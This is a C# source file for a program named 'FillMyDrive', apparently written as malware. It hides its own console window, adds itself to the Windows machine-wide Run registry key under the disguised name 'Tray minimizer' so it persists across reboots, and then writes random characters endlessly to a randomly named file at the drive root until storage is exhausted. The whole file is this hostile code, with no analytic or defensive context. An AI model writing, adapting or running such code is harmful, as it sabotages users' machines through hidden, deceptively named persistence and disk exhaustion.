using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;

namespace FillMyDrive {
    internal class Program {
        [DllImport( "user32.dll" )]
        private static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
        
        [DllImport( "Kernel32" )]
        private static extern IntPtr GetConsoleWindow();

        private const int SW_HIDE=0;
        private const int SW_SHOW=5;

        private static void Main( string[] args ) {
            var hwnd = GetConsoleWindow();
            ShowWindow( hwnd, SW_HIDE );

            startup( true );
            var root = new DirectoryInfo( "/" );
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" +
                                 "1234567890+*'!\\\"#¤%&/()=?§½@£$€{[]}-_.,:;<>\n\r\t";
            var fileName = Path.GetRandomFileName();
            if(File.Exists( root + fileName )) {
                using(var fs = File.Open( root + fileName, FileMode.Append )) {
                    while(true) {
                        for(var i = 0; i < Environment.TickCount; i++) {
                            var rnd = new Random();
                            var text = new UTF8Encoding().GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                            fs.Write( text, 0, text.Length );
                        }
                    }
                }
            }
            using(var fs = File.Create( root + fileName )) {
                while(true) {
                    for(var i = 0; i < Environment.TickCount; i++) {
                        var rnd = new Random();
                        var text = new UTF8Encoding().GetBytes( Convert.ToString( chars.Substring( rnd.Next( 0, chars.Length ), 1 ) ) );
                        fs.Write( text, 0, text.Length );
                    }
                }
            }
        }

        private static void startup( bool add ) {
            var key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
            if(add) {
                key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
            }
            key.Close();
        }
    }
}
